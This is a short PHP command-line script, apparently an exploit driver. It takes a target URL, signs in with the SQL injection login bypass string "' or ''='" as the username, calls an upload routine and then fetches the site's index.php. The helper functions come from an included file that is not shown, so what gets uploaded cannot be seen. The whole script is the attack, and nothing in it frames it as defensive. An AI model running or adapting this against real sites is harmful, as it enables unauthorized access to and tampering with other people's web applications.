<?php
$user = "' or ''='";
$pass = "boom";
if($argc==1)
{
  echo "No url provided";
  exit();
}else{
  $mainUrl = $argv[1];
}
include "main.php";
signIn($mainUrl, $user, $pass);
uploadImage($mainUrl);
$url =  $mainUrl.'/index.php';
echo curl_get($url);
?>
